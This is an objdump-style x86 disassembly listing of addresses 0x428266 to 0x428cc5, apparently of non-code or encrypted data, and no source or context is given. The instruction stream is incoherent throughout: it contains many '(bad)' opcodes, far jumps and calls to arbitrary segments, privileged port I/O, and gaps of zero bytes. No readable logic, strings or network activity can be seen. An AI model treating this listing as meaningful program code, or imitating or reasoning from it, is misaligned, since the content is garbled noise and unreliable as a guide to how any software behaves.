  428266:	mov    bl,0x21
  428268:	xchg   edi,eax
  428269:	bound  ebp,QWORD PTR [edi+esi*8-0x54]
  42826d:	mov    ch,0xb1
  42826f:	aam    0x27
  428271:	push   esp
  428272:	call   0x9a08:0x94ba8a71
  428279:	addr16 (bad) 
  42827b:	fwait
  42827c:	push   ecx
  42827d:	fs jnp 0x42829d
  428280:	mov    ah,0x26
  428282:	ret    
  428283:	pop    edi
  428284:	stos   DWORD PTR es:[edi],eax
  428285:	sbb    ah,BYTE PTR [edi-0x6f]
  428288:	jmp    0x9ee:0xebdaee9e
  42828f:	add    DWORD PTR [eax],0x0
	...
  4282f2:	add    BYTE PTR [eax],al
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	(bad)  
  428301:	(bad)  
  428302:	jns    0x42829d
  428304:	cmp    al,0xad
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	test   BYTE PTR [esi-0x26c5604f],ah
  428312:	sahf   
  428313:	mov    cl,0xd1
  428315:	out    dx,eax
  428316:	fs and al,0xf9
  428319:	imul   esp,DWORD PTR [ebp+0x52d116ff],0xffffffe6
  428320:	dec    esp
  428321:	and    bh,BYTE PTR [edx]
  428323:	adc    ebp,DWORD PTR [ebp+0x4]
  428326:	addr16 mov eax,ds:0xaf3f
  42832a:	sbb    ch,BYTE PTR [edx-0x5dd8aa22]
  428330:	das    
  428331:	shl    BYTE PTR [esi-0x6a],cl
  428334:	and    BYTE PTR ds:0x5af2b3b8,0xa9
  42833b:	xor    DWORD PTR [esp+esi*8+0x7a],edx
  42833f:	call   0x6e30:0x6f780a4a
  428346:	stos   BYTE PTR es:[edi],al
  428347:	iret   
  428348:	xchg   ecx,eax
  428349:	mov    dl,0xff
  42834b:	mov    edi,0x3e12d0fe
  428350:	out    0x96,eax
  428352:	cvtpi2ps xmm1,QWORD PTR [edi-0x2cac1b8b]
  428359:	dec    edi
  42835a:	jne    0x4283c2
  42835c:	cdq    
  42835d:	push   esi
  42835e:	int    0x62
  428360:	cld    
  428361:	dec    esp
  428362:	cmp    esp,DWORD PTR [eax]
  428364:	jnp    0x4283dd
  428366:	das    
  428367:	mov    BYTE PTR [ecx-0x4691c577],dl
  42836d:	push   ebx
  42836e:	and    bl,BYTE PTR [esi]
  428370:	mov    ebp,0x364e7018
  428375:	mov    WORD PTR [esi],?
  428377:	fidiv  DWORD PTR [edi-0x61f13141]
  42837d:	hlt    
  42837e:	jmp    0x428360
  428380:	sub    al,0xd1
  428382:	scas   al,BYTE PTR es:[edi]
  428383:	mov    WORD PTR [edi-0x59],ss
  428386:	push   esi
  428387:	in     eax,0xfb
  428389:	sti    
  42838a:	jmp    0x42837e
  42838c:	mov    eax,ds:0x4f377557
  428391:	fwait
  428392:	popf   
  428393:	and    BYTE PTR [edi+0x39],bl
  428396:	inc    esi
  428397:	nop
  428398:	scas   eax,DWORD PTR es:[edi]
  428399:	and    al,0x16
  42839b:	into   
  42839c:	je     0x428328
  42839e:	pop    esp
  42839f:	push   DWORD PTR [edi]
  4283a1:	sub    al,0x5f
  4283a3:	cmp    eax,DWORD PTR [edi+0x3e562220]
  4283a9:	psrlq  mm7,QWORD PTR [edx+0x4dec3976]
  4283b0:	sbb    ch,BYTE PTR [ecx+eiz*8]
  4283b3:	fistp  WORD PTR [eax]
  4283b5:	retf   0xc616
  4283b8:	popf   
  4283b9:	(bad)  
  4283bb:	jle    0x4283ea
  4283bd:	pop    edx
  4283be:	das    
  4283bf:	aas    
  4283c0:	pop    edi
  4283c1:	js     0x4283d3
  4283c3:	pop    ecx
  4283c4:	add    al,0x13
  4283c6:	daa    
  4283c7:	gs dec edx
  4283c9:	fsubr  st(7),st
  4283cb:	add    al,bl
  4283cd:	xor    eax,0xc4292212
  4283d2:	sub    bl,dl
  4283d4:	test   al,0x91
  4283d6:	jo     0x428400
  4283d8:	inc    ebx
  4283da:	dec    ebp
  4283db:	into   
  4283dc:	inc    edx
  4283dd:	not    DWORD PTR [ebx]
  4283df:	dec    ecx
  4283e0:	adc    al,BYTE PTR [ecx+0x69f99643]
  4283e6:	leave  
  4283e7:	jnp    0x428440
  4283e9:	icebp  
  4283ea:	add    BYTE PTR [edi+esi*1],bl
  4283ed:	mov    al,ds:0x2cb44205
  4283f2:	cdq    
  4283f3:	sahf   
  4283f4:	cmp    al,0x2d
  4283f6:	dec    ecx
  4283f7:	gs jns 0x42837a
  4283fa:	ins    BYTE PTR es:[edi],dx
  4283fb:	clc    
  4283fc:	mov    ds:0xfd3dcfd2,al
  428401:	lods   eax,DWORD PTR ds:[esi]
  428402:	call   0xc610dd59
  428407:	push   eax
  428408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428409:	cmc    
  42840a:	scas   al,BYTE PTR es:[edi]
  42840b:	pop    eax
  42840c:	test   eax,0x7b2d
	...
  428472:	add    BYTE PTR [eax],al
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x76abfb32
  428481:	fisttp WORD PTR [ebp-0x2c]
  428484:	inc    eax
  428485:	scas   al,BYTE PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	loop   0x4284c9
  42848e:	dec    ebx
  42848f:	das    
  428490:	(bad)  
  428491:	sahf   
  428492:	jns    0x42846e
  428494:	lock stc 
  428496:	cmp    dh,BYTE PTR [edx+eax*1]
  428499:	or     ecx,esp
  42849b:	sbb    ah,bl
  42849d:	neg    DWORD PTR [edi+0x15]
  4284a0:	data16 xor al,0x79
  4284a3:	daa    
  4284a4:	inc    edx
  4284a5:	add    al,0xa5
  4284a7:	mov    al,ds:0x9e1766c7
  4284ac:	rcl    DWORD PTR ds:0x25813b12,1
  4284b2:	les    esi,FWORD PTR [esi+0x66]
  4284b5:	push   edi
  4284b6:	sub    al,0x27
  4284b8:	pop    ebp
  4284b9:	inc    ebp
  4284ba:	push   esp
  4284bb:	std    
  4284bc:	sbb    edi,ecx
  4284be:	shr    DWORD PTR [ebp+0x3c],cl
  4284c1:	ds scas al,BYTE PTR es:[edi]
  4284c3:	int3   
  4284c4:	sbb    eax,0xdc945f04
  4284c9:	dec    ebx
  4284ca:	cld    
  4284cb:	outs   dx,BYTE PTR ds:[esi]
  4284cc:	sbb    DWORD PTR [edx+0x33],ebp
  4284cf:	outs   dx,DWORD PTR ds:[esi]
  4284d0:	loope  0x428538
  4284d2:	and    dl,BYTE PTR [ebp+0x48]
  4284d5:	rcl    eax,cl
  4284d7:	push   ecx
  4284d8:	or     ah,ah
  4284da:	jle    0x428506
  4284dc:	mov    ah,0xcc
  4284de:	mov    BYTE PTR [ebx-0x26c4adb7],cl
  4284e4:	pop    esi
  4284e5:	cmp    edx,ecx
  4284e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284e8:	sub    edx,DWORD PTR [edx]
  4284ea:	(bad)  
  4284eb:	imul   eax,esi,0x6
  4284ee:	or     DWORD PTR [ebp+0x50ec5938],ebx
  4284f4:	dec    ebx
  4284f5:	push   cs
  4284f6:	sub    ch,al
  4284f8:	xchg   DWORD PTR [ecx-0x7fb73c81],esi
  4284fe:	aaa    
  4284ff:	and    eax,0x528924a0
  428504:	and    bl,BYTE PTR [esi+ebx*1+0x674b2d3a]
  42850b:	pop    esp
  42850c:	pop    es
  42850d:	add    DWORD PTR [ebp+0x7f10d695],ebp
  428513:	(bad)  
  428514:	push   es
  428515:	das    
  428516:	bound  edx,QWORD PTR [esi+0x7c]
  428519:	mov    bh,0x41
  42851b:	inc    ebp
  42851c:	jnp    0x42851a
  42851e:	jnp    0x42856a
  428520:	push   ds
  428521:	imul   esi,DWORD PTR [edi-0x38],0x8754baa4
  428528:	aam    0x2a
  42852a:	sbb    cl,BYTE PTR [ebx+eax*2+0x1c]
  42852e:	mov    dh,0x69
  428530:	push   edi
  428531:	push   cs
  428532:	mov    esi,0x20455cf3
  428537:	xor    eax,0xb4a29f88
  42853c:	push   ss
  42853d:	push   edx
  42853e:	xor    dh,ch
  428540:	sbb    bl,BYTE PTR [edi-0x37b4d32]
  428546:	sti    
  428547:	sbb    dl,bh
  428549:	mov    ah,0x82
  42854b:	mov    eax,ds:0xa7ebc281
  428550:	dec    esp
  428551:	sub    eax,0x502e094f
  428556:	(bad)  
  428557:	sti    
  428558:	push   es
  428559:	ret    
  42855a:	cmp    esp,DWORD PTR [edi]
  42855c:	push   ebx
  42855d:	daa    
  42855e:	inc    edx
  42855f:	out    dx,al
  428560:	inc    esi
  428561:	jge    0x42851f
  428563:	mov    BYTE PTR [ecx],bh
  428565:	xor    bl,cl
  428567:	in     al,0x35
  428569:	jge    0x42859b
  42856b:	sub    DWORD PTR [ebx-0x4208ba8e],0x79
  428572:	scas   eax,DWORD PTR es:[edi]
  428573:	xor    BYTE PTR [esi-0x66],cl
  428576:	sti    
  428577:	nop
  428578:	fist   DWORD PTR [esi+edi*4]
  42857b:	mov    esp,0x9d118907
  428580:	adc    DWORD PTR [ebx-0x2],edi
  428583:	adc    eax,0x4d4046d6
  428588:	(bad)  
  428589:	jg     0x428543
  42858b:	or     al,0x3c
  42858d:	repz dec edi
  42858f:	bound  eax,QWORD PTR [eax]
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x92d0a3f6
  428602:	push   edi
  428603:	jne    0x428649
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	rol    edx,cl
  42860e:	cs mov ebx,edi
  428611:	sbb    eax,0xc988c7ba
  428616:	aam    0xa9
  428618:	dec    edi
  428619:	jmp    0x4285e5
  42861b:	repz (bad) 
  42861d:	stc    
  42861e:	xchg   ebx,eax
  42861f:	and    bh,BYTE PTR [esi+ebx*8]
  428622:	ror    DWORD PTR [edx+0x26],0x9d
  428626:	mov    ebx,0x5ce0d5d9
  42862b:	jne    0x4285fc
  42862d:	pop    ss
  42862e:	pop    esi
  42862f:	add    ecx,ecx
  428631:	xchg   ebx,eax
  428632:	inc    esp
  428633:	mov    es,WORD PTR [ecx+ebp*2+0x63]
  428637:	sub    bl,dl
  428639:	popa   
  42863a:	pop    ebp
  42863b:	fldenv [ecx-0x18]
  42863e:	outs   dx,BYTE PTR ds:[esi]
  42863f:	dec    edx
  428640:	mov    bh,ah
  428642:	mov    DWORD PTR [edi+0xef0b8da],edx
  428648:	rcr    DWORD PTR es:[ecx+0x29f1e4d5],0xb3
  428650:	or     al,BYTE PTR [eax-0x6b8e7b9f]
  428656:	mov    esi,0xead18031
  42865b:	jmp    0x42868b
  42865d:	nop
  42865e:	and    eax,0x208147d9
  428663:	in     eax,dx
  428664:	iret   
  428665:	int    0xf1
  428667:	mov    bh,ah
  428669:	and    ecx,DWORD PTR [ebx-0xe098577]
  42866f:	fldenv [esi]
  428671:	(bad)  
  428672:	pop    ecx
  428673:	rcl    DWORD PTR [edx-0x5a],0x8c
  428677:	sbb    eax,0xa25879c4
  42867c:	and    eax,0x5693423a
  428681:	call   0xfa2c9c47
  428686:	cwde   
  428687:	frstor [ebx-0x1948cfad]
  42868d:	mov    cl,0xdb
  42868f:	mov    edx,0x2999d6e
  428694:	sbb    BYTE PTR [eax+0x6b],cl
  428697:	inc    ecx
  428698:	test   eax,0x31fcc90d
  42869d:	aam    0x0
  42869f:	cdq    
  4286a0:	push   ss
  4286a1:	mov    bl,0x92
  4286a3:	pop    ebx
  4286a4:	push   ds
  4286a5:	dec    ebp
  4286a6:	dec    edx
  4286a7:	add    BYTE PTR [ecx+0x6d],bl
  4286aa:	fwait
  4286ab:	jmp    0xa15a448c
  4286b0:	mov    esp,0xcd880b0b
  4286b5:	cwde   
  4286b6:	das    
  4286b7:	push   ebp
  4286b8:	fcomp  DWORD PTR [eax+0x112cf6b8]
  4286be:	sub    eax,0xc82d7dc2
  4286c3:	(bad)  
  4286c4:	fs mov ch,0x5b
  4286c7:	ret    0x16fe
  4286ca:	mov    ecx,0x12901e1a
  4286cf:	clc    
  4286d0:	push   cs
  4286d1:	xor    al,BYTE PTR [eax+0x434bfd78]
  4286d7:	std    
  4286d8:	jne    0x42874a
  4286da:	dec    ecx
  4286db:	push   edi
  4286dc:	imul   esp,DWORD PTR [edx+0x24],0xffffff8c
  4286e0:	mov    ebp,0x1a349840
  4286e5:	dec    edx
  4286e6:	or     BYTE PTR [edx+0x32053776],dh
  4286ec:	adc    al,BYTE PTR [ecx+0x23]
  4286ef:	jg     0x428741
  4286f1:	jmp    0xbb91:0x5def3054
  4286f8:	mov    dl,0xe0
  4286fa:	add    al,0xe2
  4286fc:	xchg   BYTE PTR [edi+edx*4-0x4b],ah
  428700:	inc    edx
  428701:	mov    bh,0xdd
  428703:	cdq    
  428704:	sub    DWORD PTR [esi],ebp
  428706:	ret    0x3ec4
  428709:	xchg   ebp,eax
  42870a:	inc    ebx
  42870b:	mov    ebx,0xa1f3733
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xcbbba796
  428783:	push   0x48
  428785:	mov    al,0x1
  428787:	add    BYTE PTR [ecx+eax*1],al
  42878a:	add    BYTE PTR [eax],al
  42878c:	call   0xf00305c
  428791:	adc    dl,BYTE PTR [edi+0x5b]
  428794:	outs   dx,BYTE PTR ds:[esi]
  428795:	adc    ebp,DWORD PTR [edi+eax*4+0x15ed8764]
  42879c:	aas    
  42879d:	call   0x7c0fac06
  4287a2:	aaa    
  4287a3:	sub    al,0x91
  4287a5:	out    dx,eax
  4287a6:	or     eax,0x283f9727
  4287ab:	std    
  4287ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287ad:	push   ebp
  4287ae:	into   
  4287af:	pop    ds
  4287b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287b1:	es jecxz 0x42875a
  4287b4:	arpl   dx,di
  4287b6:	xlat   BYTE PTR ds:[ebx]
  4287b7:	frstor [esi-0x2ebe43b8]
  4287bd:	push   edx
  4287be:	data16 add ch,BYTE PTR [ecx+ecx*1]
  4287c2:	adc    DWORD PTR [edx-0x8c3c91f],ecx
  4287c8:	xchg   ebx,eax
  4287c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287ca:	add    al,0x92
  4287cc:	lea    ecx,[edi]
  4287ce:	lea    edi,[edx-0x1a]
  4287d1:	shl    BYTE PTR [edx+0x3e97fc0c],1
  4287d7:	mov    BYTE PTR [edx],al
  4287d9:	adc    eax,ecx
  4287db:	out    dx,eax
  4287dc:	mul    BYTE PTR [eax+0x3b]
  4287df:	cmp    esi,ecx
  4287e1:	push   eax
  4287e2:	out    dx,al
  4287e3:	mov    eax,0x74c0ac8f
  4287e8:	rol    BYTE PTR [eax-0x36bf5ff9],cl
  4287ee:	imul   ecx,DWORD PTR [ecx-0x48346cde],0x41a784fb
  4287f8:	xchg   BYTE PTR [edx-0x73],ch
  4287fb:	imul   esp,DWORD PTR ds:0x8b8e5d26,0xc
  428802:	and    ch,bh
  428804:	mov    al,ds:0x4dbab3b2
  428809:	jo     0x4287be
  42880b:	lods   al,BYTE PTR es:[esi]
  42880d:	out    0xb7,eax
  42880f:	and    esp,DWORD PTR [ecx-0x1d]
  428812:	popa   
  428813:	pop    ebx
  428814:	(bad)
  428817:	ret    
  428818:	jle    0x428836
  42881a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42881b:	adc    ebp,0xfffffffd
  42881e:	in     al,0xce
  428820:	es mov dl,0x83
  428823:	shl    BYTE PTR [eax+0x3b],0x47
  428827:	aad    0x50
  428829:	call   0x11db:0x89519010
  428830:	rcr    ch,0xe9
  428833:	cld    
  428834:	mov    bh,BYTE PTR [edx-0x27]
  428837:	push   ebx
  428838:	loop   0x428886
  42883a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42883b:	(bad)  [edi+0x6cd9f3ff]
  428841:	jne    0x4288bc
  428843:	pop    ss
  428844:	jge    0x428814
  428846:	xor    DWORD PTR [esp+eiz*2],ecx
  428849:	nop    edi
  42884c:	sbb    edx,DWORD PTR [edx-0x2f3ad270]
  428852:	inc    edi
  428853:	adc    al,0x38
  428855:	enter  0x6787,0xd3
  428859:	push   eax
  42885a:	aaa    
  42885b:	fcomp  QWORD PTR [edx+0x33]
  42885e:	dec    ecx
  42885f:	jmp    0x4288b1
  428861:	(bad)  
  428862:	or     DWORD PTR [esi-0x7d6f33a],esp
  428868:	lea    ebp,[ecx-0x613b3294]
  42886e:	mov    ch,0x86
  428870:	xlat   BYTE PTR ds:[ebx]
  428871:	jns    0x4288b1
  428873:	pop    ds
  428874:	or     eax,0xd8d1881d
  428879:	mov    DWORD PTR [edx-0x6c],eax
  42887c:	xchg   BYTE PTR ds:0xf8352a1f,dh
  428882:	jg     0x4288c0
  428884:	sbb    eax,DWORD PTR [edx]
  428886:	ret    
  428887:	dec    ebx
  428888:	dec    ebp
  428889:	cdq    
  42888a:	sbb    BYTE PTR [ecx+0x3d],cl
  42888d:	xor    BYTE PTR [ecx],0x2a
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x19d19d0f],bx
  428902:	in     al,0xe6
  428904:	dec    esp
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	mov    ecx,0x52323487
  428911:	cld    
  428912:	cmp    esi,DWORD PTR [edi-0x4a221e61]
  428918:	mov    bh,0x2b
  42891a:	cmc    
  42891b:	fistp  WORD PTR [ecx]
  42891d:	test   eax,0x98376eb5
  428922:	inc    eax
  428923:	fldl2e 
  428925:	out    0x78,al
  428927:	imul   esi,DWORD PTR [esi+0x5d95de17],0xffffff9e
  42892e:	addr16 iret 
  428930:	inc    ebp
  428931:	jo     0x428911
  428933:	pop    edi
  428934:	loopne 0x428915
  428936:	jns    0x428939
  428938:	test   BYTE PTR [ebx-0x31],0xc9
  42893c:	mov    cl,0xda
  42893e:	pusha  
  42893f:	fnstcw WORD PTR [ebp+0x46]
  428942:	inc    edx
  428943:	into   
  428944:	icebp  
  428945:	retf   
  428946:	dec    edi
  428947:	mov    dl,0x20
  428949:	add    eax,0x6675fc9c
  42894e:	add    BYTE PTR ds:0xe1ee0ce5,al
  428954:	scas   al,BYTE PTR es:[edi]
  428955:	pop    es
  428956:	repz popf 
  428958:	cs inc edx
  42895a:	imul   edi,ebp,0xa246c0d3
  428960:	jecxz  0x4289b4
  428962:	mov    fs,WORD PTR [ecx]
  428964:	push   esp
  428965:	mov    eax,0xa27f97ce
  42896a:	iret   
  42896b:	or     DWORD PTR [edx+0x6e992258],esi
  428971:	aas    
  428972:	fst    DWORD PTR [edx+0x70ef1751]
  428978:	int3   
  428979:	(bad)  
  42897a:	pusha  
  42897b:	push   0xffffffdf
  42897d:	test   al,dl
  42897f:	push   ss
  428980:	das    
  428981:	(bad)  
  428982:	cmp    DWORD PTR [ebp+0x6a],esp
  428985:	lods   al,BYTE PTR ds:[esi]
  428986:	add    DWORD PTR [edi+0x56be8bf1],0xffffffac
  42898d:	ret    0x4b4
  428990:	mov    esi,DWORD PTR [ecx+0x3f]
  428993:	ja     0x428a0d
  428995:	inc    esi
  428996:	jecxz  0x4289be
  428998:	push   0x75fbba9
  42899d:	call   0x3070e2ea
  4289a2:	mov    WORD PTR [ebx-0x66d59a47],ss
  4289a8:	adc    DWORD PTR [ebp-0x46],ebp
  4289ab:	(bad)  
  4289ad:	xchg   DWORD PTR [ecx],esp
  4289af:	push   ebx
  4289b0:	xchg   BYTE PTR [ecx+0x538b8f6c],ch
  4289b6:	out    0x17,eax
  4289b8:	test   ah,0xfa
  4289bb:	rcl    DWORD PTR [edx-0x30e85b09],1
  4289c1:	add    al,0x54
  4289c3:	sbb    ah,BYTE PTR [ebx]
  4289c5:	cmp    eax,0x36e1fb88
  4289ca:	push   edx
  4289cb:	jb     0x428a3d
  4289cd:	clc    
  4289ce:	leave  
  4289cf:	pop    ds
  4289d0:	push   0xffffffb9
  4289d2:	adc    eax,0x7ca6fd0b
  4289d7:	fs xor eax,0x331a7d30
  4289dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289de:	scas   al,BYTE PTR es:[edi]
  4289df:	fsubr  st,st(7)
  4289e1:	jl     0x428a51
  4289e3:	xchg   ebp,eax
  4289e4:	icebp  
  4289e5:	jp     0x428a61
  4289e7:	mov    ecx,0xbc54018
  4289ec:	clc    
  4289ed:	cmovs  ebx,DWORD PTR [ebx-0x28e6dfae]
  4289f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289f5:	inc    edi
  4289f6:	or     cl,bh
  4289f8:	mov    eax,0xbe3d593c
  4289fd:	fstp   TBYTE PTR [edi]
  4289ff:	mov    ecx,0xd498d7ae
  428a04:	adc    BYTE PTR [esi+edx*4],bh
  428a07:	or     dh,BYTE PTR [eax]
  428a09:	sub    edx,edx
  428a0b:	dec    edx
  428a0c:	sub    al,0x7b
  428a0e:	xlat   BYTE PTR ds:[ebx]
  428a0f:	inc    ebx
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x2f2467ed]
  428a83:	mov    al,0x50
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	jns    0x428a70
  428a8e:	adc    eax,0xffffffdb
  428a91:	push   ds
  428a92:	fcomp  QWORD PTR [eax]
  428a94:	test   al,0xcb
  428a96:	mov    ch,0x84
  428a98:	lea    esp,[ebx]
  428a9a:	stos   DWORD PTR es:[edi],eax
  428a9b:	shr    DWORD PTR [eax+eiz*2-0x1bda6b9d],cl
  428aa2:	out    0x55,al
  428aa4:	add    al,0x35
  428aa6:	jo     0x428ac5
  428aa8:	repz mov al,ds:0x1d53f592
  428aae:	int3   
  428aaf:	lods   eax,DWORD PTR ds:[esi]
  428ab0:	(bad)
  428ab3:	scas   al,BYTE PTR es:[edi]
  428ab4:	and    DWORD PTR [eax+0x0],ebp
  428ab7:	test   al,0xec
  428ab9:	rol    bh,1
  428abb:	daa    
  428abc:	mov    BYTE PTR [eax+0x40],ah
  428abf:	push   edi
  428ac0:	mov    eax,ds:0x3d6b92c4
  428ac5:	gs setno dl
  428ac9:	mov    dl,BYTE PTR [edi-0x5]
  428acc:	or     DWORD PTR [edi],esp
  428ace:	jp     0x428a9d
  428ad0:	xlat   BYTE PTR ds:[ebx]
  428ad1:	lods   al,BYTE PTR ds:[esi]
  428ad2:	sti    
  428ad3:	icebp  
  428ad4:	call   0xa415:0xc61691d5
  428adb:	sub    DWORD PTR [edi+0x1a864e13],edi
  428ae1:	repz mov dh,0xa0
  428ae4:	scas   eax,DWORD PTR es:[edi]
  428ae5:	pop    ebp
  428ae6:	pop    edi
  428ae7:	sub    bh,ah
  428ae9:	cld    
  428aea:	dec    ecx
  428aeb:	pop    ebx
  428aec:	outs   dx,DWORD PTR ds:[esi]
  428aed:	fcmovb st,st(4)
  428aef:	xor    ebx,DWORD PTR [ebx+ebx*8-0x165a8c26]
  428af6:	pop    esi
  428af7:	pop    esi
  428af8:	fbstp  TBYTE PTR [edx-0x661a0659]
  428afe:	icebp  
  428aff:	mov    WORD PTR [edx-0x21],es
  428b02:	xchg   esp,eax
  428b03:	pop    ebp
  428b04:	sub    eax,0x7e7d73ad
  428b09:	or     cl,BYTE PTR [ebx]
  428b0b:	mov    es,WORD PTR [eax+0x4d6bcad7]
  428b11:	out    dx,eax
  428b12:	xrelease mov DWORD PTR [ebp+0x71],0xb90b2738
  428b1a:	fsubr  st,st(6)
  428b1c:	mov    DWORD PTR [ecx],esi
  428b1e:	sub    DWORD PTR ds:0xb85fbae2,ebx
  428b24:	mov    edi,0x69dcbd6d
  428b29:	fist   DWORD PTR [esi-0x7a3852b0]
  428b2f:	jne    0x428b7d
  428b31:	fs ror bh,cl
  428b34:	mov    BYTE PTR [ebx+0x67],dh
  428b37:	ret    0x8fc8
  428b3a:	jo     0x428b10
  428b3c:	add    dh,BYTE PTR ds:0xd9d3cc14
  428b42:	push   esp
  428b43:	dec    edi
  428b44:	push   edx
  428b45:	cmp    al,0x63
  428b47:	inc    eax
  428b48:	and    BYTE PTR [ecx+0x6e],cl
  428b4b:	pop    edx
  428b4c:	inc    ebx
  428b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b4e:	sbb    DWORD PTR [eax+0x5b],0xffffffe2
  428b52:	cdq    
  428b53:	jge    0x428b2e
  428b55:	sub    al,0x55
  428b57:	jecxz  0x428b0b
  428b59:	bound  edi,QWORD PTR [eax]
  428b5b:	cld    
  428b5c:	repz cmp dl,al
  428b5f:	fld    TBYTE PTR [ebx+0x61]
  428b62:	fwait
  428b63:	add    al,0xcc
  428b65:	push   0x5db27670
  428b6a:	add    al,0xad
  428b6c:	jmp    0x428b84
  428b6e:	push   ebp
  428b6f:	xchg   edx,eax
  428b70:	daa    
  428b71:	ret    
  428b72:	popf   
  428b73:	div    DWORD PTR [edi]
  428b75:	jg     0x428bce
  428b77:	ins    BYTE PTR es:[edi],dx
  428b78:	and    dh,BYTE PTR [esi+eiz*2]
  428b7b:	aad    0xaa
  428b7d:	dec    edi
  428b7e:	outs   dx,BYTE PTR ds:[esi]
  428b7f:	das    
  428b80:	imul   ebp,edx,0x5693ec18
  428b86:	in     al,0x4d
  428b88:	out    dx,eax
  428b89:	test   DWORD PTR fs:[eax+eax*8+0xaf71c6],ebp
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x3a351746
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	call   0x721708f7
  428c11:	xor    eax,0x8ac44385
  428c16:	mov    ch,0xcd
  428c18:	scas   eax,DWORD PTR es:[edi]
  428c19:	xchg   edi,eax
  428c1a:	mov    edi,0xb45ac79f
  428c1f:	popf   
  428c20:	test   eax,0x12fbf47e
  428c25:	loop   0x428c95
  428c27:	repnz pushf 
  428c29:	sti    
  428c2a:	(bad)  
  428c2b:	in     al,0xa
  428c2d:	pop    ebp
  428c2e:	push   eax
  428c2f:	jmp    0xed4a:0xdd41b5f5
  428c36:	mov    dl,0x63
  428c38:	inc    ecx
  428c39:	pusha  
  428c3a:	imul   ebp,edx,0x10
  428c3d:	jb     0x428c3d
  428c3f:	bound  edi,QWORD PTR [edi+0x61d26361]
  428c45:	jne    0x428bda
  428c47:	out    0x56,al
  428c49:	fmul   DWORD PTR [esi-0x72]
  428c4c:	mov    ah,0x1a
  428c4e:	jne    0x428c0b
  428c50:	cs jbe 0x428c89
  428c53:	ins    DWORD PTR es:[edi],dx
  428c54:	mov    dh,0xc0
  428c56:	jb     0x428bf0
  428c58:	test   dh,dh
  428c5a:	pop    es
  428c5b:	sbb    eax,0xa0412226
  428c60:	pop    es
  428c61:	lock dec ebx
  428c63:	mov    ebx,0x7c243581
  428c68:	or     DWORD PTR [edi+esi*8+0x15],0x5d
  428c6d:	test   DWORD PTR [edx+0x7d],eax
  428c70:	(bad)  
  428c71:	pop    ebx
  428c72:	xchg   esi,eax
  428c73:	adc    dh,BYTE PTR [edx-0x26]
  428c76:	int3   
  428c77:	mov    DWORD PTR [ecx],esi
  428c79:	not    BYTE PTR [eax]
  428c7b:	pop    ebx
  428c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c7d:	jle    0x428c09
  428c7f:	int    0xd7
  428c81:	jns    0x428c04
  428c83:	xchg   esp,eax
  428c84:	push   ecx
  428c85:	mov    ebp,0x7fdd6f99
  428c8a:	lds    ecx,FWORD PTR [esi]
  428c8c:	dec    edx
  428c8d:	cmp    al,0xd6
  428c8f:	pop    ebx
  428c90:	cmc    
  428c91:	dec    ecx
  428c92:	pop    eax
  428c93:	aad    0xb4
  428c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c96:	inc    esi
  428c97:	(bad)  
  428c98:	in     al,0xfb
  428c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c9b:	pop    ebp
  428c9c:	sub    BYTE PTR [eax],ah
  428c9e:	dec    esp
  428c9f:	aad    0xdd
  428ca1:	mov    al,ds:0xce1709f
  428ca6:	mov    WORD PTR [edx],gs
  428ca8:	iret   
  428ca9:	or     bl,BYTE PTR [ebp+0x5b]
  428cac:	pop    edx
  428cad:	jle    0x428c49
  428caf:	test   DWORD PTR [ebx],ebx
  428cb1:	(bad)  
  428cb3:	fisubr DWORD PTR [edi+ebp*2-0x32e2fef8]
  428cba:	inc    ecx
  428cbb:	jno    0x428d09
  428cbd:	push   es
  428cbe:	jmp    0xe05e:0x63d9f365
  428cc5:	sbb    cl,dh
